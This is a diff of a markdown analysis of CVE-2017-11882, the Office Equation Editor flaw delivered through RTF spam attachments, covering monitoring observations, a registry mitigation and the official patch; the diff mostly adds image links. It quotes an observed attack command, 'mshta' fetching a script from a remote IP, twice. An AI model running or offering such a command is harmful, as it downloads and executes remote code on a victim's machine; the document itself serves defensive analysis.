@@ -21,7 +21,8 @@
 1.	A spam __email__
 2.	An __attachment__
 3.	A __.doc file__ in Rich Text Format (RTF)
-4.	__Microsoft Office__ will automatically open it
+4.	__Microsoft Office__ will automatically open it  
+![Spam Email](https://github.com/tingsama/hacking-p2/blob/main/Spam%20Email.png)
 
 
 ### Process Monitor
@@ -29,14 +30,16 @@ It is an [advanced monitoring tool for Windows](https://nvd.nist.gov/vuln-metric
 It is used to monitor and display all the activities of file system in real-time. [reference 1](https://en.wikipedia.org/wiki/Process_Monitor)  
 * Unexpected operation named 'EQNEDT32.EXE'
 * Command line has been called
-* (Very like) a malicious host - 'mshta http://104.254.99.77/x.txt' 
+* (Very like) a malicious host - 'mshta http://104.254.99.77/x.txt'  
+![]()  
 
 
 ### Burp Suite
 It is a [web vulnerability scanner](https://portswigger.net/burp).  
 It is a set of tools used for penetration testing of web applications. [reference 2](https://www.geeksforgeeks.org/what-is-burp-suite/g)  
 * Unexpected 'GET' request 
-* (Very like) a malicious host - 'mshta http://104.254.99.77/x.txt' 
+* (Very like) a malicious host - 'mshta http://104.254.99.77/x.txt'  
+![]()  
 
 
 ### Steps after you click the malicious word file:
@@ -91,6 +94,7 @@ The best way to protect your machine from this vulnerability is patching.
 However, if you decide not to patch, a simple way to protect your machine is to disable EQUAEDT32.exe which is the equation editor that has the vulnerability.  
 The following commands can update your registry to disable EQUAEDT32.exe.  
 If you have an Office software running on a x64 machine, then you can use the second command, otherwise the first command is your choice.
+![]()  
 
 
 ### [Official Patch](https://blog.0patch.com/2017/11/official-patch-for-cve-2017-11882-meets.html)
@@ -98,4 +102,6 @@ The official patching for CVE-2017-11882 was done in a Patch Tuesday update in N
 The difference of the patched function(left hand side) and the original function(right hand side) is shown below.  
 The left top block shows that a boundary check is added. This line of code reset the counter register to 0x20 if it is larger than or equal to 0x21.  
 The left bottom block added a buffer truncation. This code makes sure only 0x20 bytes are copied and zero-terminate. [5]  
+![]()  
+
 
